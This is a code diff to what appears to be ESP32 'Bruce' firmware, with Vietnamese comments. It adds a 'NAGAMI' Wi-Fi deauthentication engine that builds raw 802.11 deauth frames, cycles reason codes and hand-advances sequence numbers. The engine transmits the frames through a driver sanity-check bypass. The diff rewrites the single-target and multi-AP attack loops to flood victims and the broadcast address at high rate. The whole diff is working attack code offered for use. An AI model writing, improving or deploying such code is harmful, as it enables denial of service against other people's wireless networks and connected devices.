@@ -36,6 +36,20 @@ std::vector<wifi_ap_record_t> ap_records;
  * @attention This function is not meant to be called!
  * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
  */
+// --- NAGAMI ULTIMATE CORE ---
+typedef struct {
+    uint8_t frame_ctrl[2];
+    uint8_t duration[2];
+    uint8_t da[6];
+    uint8_t sa[6];
+    uint8_t bssid[6];
+    uint8_t seq[2];
+    uint8_t reason[2];
+} __attribute__((packed)) nagami_frame_t;
+
+static uint16_t nagami_seq = 0; // Quản lý số thứ tự gói tin
+uint16_t nagami_reasons[] = {1, 4, 6, 7, 8, 39}; // Danh sách mã lỗi "hủy diệt"
+
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
     if (arg == 31337) return 1;
     else return 0;
@@ -741,6 +755,35 @@ AGAIN:
     loopOptions(options);
     if (!returnToMenu) goto AGAIN;
 }
+/***************************************************************************************
+***************************************************************************************/
+void nagami_fire(uint8_t* victim_mac, uint8_t* ap_bssid) {
+    for (int r = 0; r < 6; r++) { // Xoay vòng 6 mã lỗi
+        nagami_frame_t frame;
+        frame.frame_ctrl[0] = 0xC0; // Loại gói: Deauthentication
+        frame.frame_ctrl[1] = 0x00;
+        frame.duration[0] = 0x3A;
+        frame.duration[1] = 0x01;
+        
+        memcpy(frame.da, victim_mac, 6);
+        memcpy(frame.sa, ap_bssid, 6);
+        memcpy(frame.bssid, ap_bssid, 6);
+        
+        // Nhảy Sequence Number thủ công (Chìa khóa sức mạnh)
+        nagami_seq = (nagami_seq + 1) % 4096;
+        uint16_t seq_ctrl = (nagami_seq << 4);
+        frame.seq[0] = seq_ctrl & 0xFF;
+        frame.seq[1] = (seq_ctrl >> 8) & 0xFF;
+        
+        // Gán Reason Code
+        frame.reason[0] = nagami_reasons[r] & 0xFF;
+        frame.reason[1] = (nagami_reasons[r] >> 8) & 0xFF;
+
+        // Bắn qua Driver Bypass của Bruce
+        esp_wifi_80211_tx(WIFI_IF_AP, &frame, sizeof(frame), false);
+    }
+}
+
 
 /***************************************************************************************
 ** function: target_atk
@@ -748,85 +791,27 @@ AGAIN:
 ***************************************************************************************/
 void target_atk(String tssid, String mac, uint8_t channel) {
     resetGlobalState();
-    // Stop WebUI before setting WiFi mode for attack
     cleanlyStopWebUiForWiFiFeature();
     if (!wifi_atk_setWifi()) return;
 
-    // Prepare deauth frame
-    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-    wsl_bypasser_send_raw_frame(&ap_record, channel, _default_target);
+    drawMainBorderWithTitle("NAGAMI SINGLE");
+    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
+    tft.println("\nTarget: " + tssid);
+    tft.println("Mode: ULTIMATE");
 
-    // Attack loop variables
-    const uint16_t UPDATE_INTERVAL_MS = 2000;
-    const uint8_t FRAMES_PER_SEND = 3;
+    uint8_t victim[6];
+    sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &victim[0], &victim[1], &victim[2], &victim[3], &victim[4], &victim[5]);
 
-    uint32_t lastUpdateTime = millis();
-    uint32_t frameCount = 0;
-    bool needsRedraw = true;
-    bool attackActive = true;
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 
-    check(SelPress);
-    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-    tft.setTextSize(FM);
-    setCpuFrequencyMhz(CONFIG_ESP_DEFAULT_CPU_FREQ_MHZ);
+    while (true) {
+        // Đòn đánh kép: Đánh trực diện Victim và đánh lan toàn mạng (Broadcast)
+        nagami_fire(victim, victim);
+        nagami_fire((uint8_t*)_default_target, victim);
 
-    while (attackActive) {
-        // Render UI if needed
-        if (needsRedraw) {
-            drawMainBorderWithTitle("Target Deauth");
-            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-
-            // Dynamic vertical spacing based on screen height
-            uint16_t lineHeight = tftHeight / 20;
-            uint16_t startY = lineHeight * 3;
-
-            padprintln("");
-            padprintln("AP: " + tssid);
-            padprintln("Channel: " + String(channel));
-            padprintln(mac);
-            vTaskDelay(50 / portTICK_PERIOD_MS);
-            needsRedraw = false;
-        }
-
-        // Send deauth frame
-        send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
-        frameCount += FRAMES_PER_SEND;
-
-        // Update FPS counter periodically
-        uint32_t currentTime = millis();
-        if (currentTime - lastUpdateTime >= UPDATE_INTERVAL_MS) {
-            // Calculate dynamic position for status text
-            uint16_t statusX = tftWidth * 0.05;
-            uint16_t statusY = tftHeight - (tftHeight * 0.08);
-
-            tft.setCursor(statusX, statusY);
-
-            // Calculate frames per second correctly
-            float fps = (frameCount * 1000.0) / (currentTime - lastUpdateTime);
-            tft.print("Frames: " + String((int)fps) + "/s   ");
-
-            frameCount = 0;
-            lastUpdateTime = currentTime;
-        }
-
-        // Handle pause/resume
-        if (check(SelPress) || EscPress) {
-            EscPress = false;
-            displayTextLine("Deauth Paused");
-            delay(500);
-
-            // Wait for user input
-            while (!check(SelPress)) {
-                vTaskDelay(10 / portTICK_PERIOD_MS);
-                if (check(EscPress)) {
-                    attackActive = false;
-                    break;
-                }
-            }
-            needsRedraw = true;
-        }
+        vTaskDelay(pdMS_TO_TICKS(5)); // Tần suất cực cao
+        if (check(EscPress)) break;
     }
-
     wifi_atk_unsetWifi();
     returnToMenu = true;
 }
@@ -1090,66 +1075,27 @@ void beaconAttack() {
 // =========================================================================
 // 1. ENGINE ĐÁNH MULTI - BẢN TỐI ƯU: RAPID FIRE + RANDOM REASON CODE + UI TĨNH
 void execute_multi_bruce_style(const std::vector<wifi_ap_record_t>& targets) {
-    if (targets.empty()) {
-        displayTextLine("No APs found!");
-        delay(1000);
-        wifi_atk_unsetWifi();
-        returnToMenu = true;
-        return;
-    }
-
-    // --- VẼ UI TĨNH (CHỈ VẼ 1 LẦN DUY NHẤT) ---
-    drawMainBorderWithTitle("Multi-Atk EXTREME");
-    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
-    tft.setCursor(10, 40);
-    tft.println("Aggressive Mode Active!");
-
-    int startY = 60;
-    for (size_t i = 0; i < targets.size(); i++) {
-        String ssid_str = String((char*)targets[i].ssid);
-        if (ssid_str.length() == 0) ssid_str = "HIDDEN";
-        if (ssid_str.length() > 16) ssid_str = ssid_str.substring(0, 16) + "..";
-        tft.setCursor(10, startY + (i * 18));
-        tft.println("> " + ssid_str + " (Ch" + String(targets[i].primary) + ")");
-    }
-    // ------------------------------------------
-
-    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-
-    // Danh sách Reason Code phổ biến để đánh lừa Client
-    uint8_t reasons[] = {0x01, 0x02, 0x04, 0x06, 0x07};
+    if (targets.empty()) { return; }
+    drawMainBorderWithTitle("NAGAMI MULTI");
+    tft.setTextColor(TFT_MAGENTA, bruceConfig.bgColor);
+    tft.println("Ultimate Engine Active!");
 
     while (true) {
         for (const auto &target : targets) {
-            // Chuyển kênh và chuẩn bị frame
-            wsl_bypasser_send_raw_frame(&target, target.primary, _default_target);
-            
-            // ÉP XUNG: Nghỉ 5ms để ổn định Radio sau khi nhảy kênh
-            vTaskDelay(pdMS_TO_TICKS(5));
+            esp_wifi_set_channel(target.primary, WIFI_SECOND_CHAN_NONE);
+            vTaskDelay(pdMS_TO_TICKS(5)); 
 
-            // BẮN RÁT (50 đợt x 3 gói = 150 gói / AP) + RANDOM REASON CODE
-            for (int i = 0; i < 50; i++) {
-                // Thay đổi Reason Code ở byte thứ 24 của frame
-                deauth_frame[24] = reasons[random(0, 5)];
-                
-                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+            // Burst 10 loạt Nagami mỗi AP (60 gói tin đa dạng mã lỗi)
+            for (int i = 0; i < 10; i++) {
+                nagami_fire((uint8_t*)_default_target, (uint8_t*)target.bssid);
                 if (check(EscPress)) goto EXIT_ENGINE;
             }
-            
-            // Nghỉ 2ms để FreeRTOS không kick Watchdog
-            vTaskDelay(pdMS_TO_TICKS(2));
-            if (check(EscPress)) goto EXIT_ENGINE;
         }
-        
-        // Nghỉ vòng lặp lớn 10ms
         vTaskDelay(pdMS_TO_TICKS(10));
         if (check(EscPress)) goto EXIT_ENGINE;
     }
-
 EXIT_ENGINE:
-    displayTextLine("Stopping Atk...");
     wifi_atk_unsetWifi();
-    delay(500);
     returnToMenu = true;
 }
 
